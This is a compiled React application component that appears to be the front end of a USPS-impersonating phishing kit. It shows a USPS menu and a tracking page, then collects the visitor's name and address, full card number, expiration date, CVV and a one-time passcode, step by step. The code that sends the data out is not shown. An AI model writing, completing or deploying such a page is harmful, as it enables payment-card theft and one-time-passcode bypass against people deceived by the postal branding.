code: import React,{useState,useEffect}from'react';import AddressForm from'./components/AddressForm';import PaymentForm from'./components/PaymentForm';import OtpForm from'./components/OtpForm';import USPSMenu from'./Menu/USPSMenu';import TrackingPage from'./components/TrackingPage';import{jsx as _jsx,jsxs as _jsxs,Fragment as _Fragment}from"react/jsx-runtime";function App(){const[step,setStep]=useState('address');const[formData,setFormData]=useState({firstName:'',lastName:'',country:'',address:'',zipCode:'',city:'',cardNumber:'',expirationDate:'',cvv:'',otp:''});const[error,setError]=useState('');const nextStep=()=>{if(step==='address')setStep('payment');else if(step==='payment')setStep('otp');};const handleChange=e=>{const{name,value}=e.target;setFormData(prev=>({...prev,[name]:value}));};return/*#__PURE__*/_jsxs(_Fragment,{children:[/*#__PURE__*/_jsx(USPSMenu,{}),/*#__PURE__*/_jsx(TrackingPage,{}),/*#__PURE__*/_jsxs("div",{className:"app-container",children:[step==='address'&&/*#__PURE__*/_jsx(AddressForm,{formData:formData,handleChange:handleChange,nextStep:nextStep,error:error,setError:setError}),step==='payment'&&/*#__PURE__*/_jsx(PaymentForm,{formData:formData,handleChange:handleChange,nextStep:nextStep,setError:setError}),step==='otp'&&/*#__PURE__*/_jsx(OtpForm,{formData:formData,handleChange:handleChange,setError:setError})]})]});}export default App;
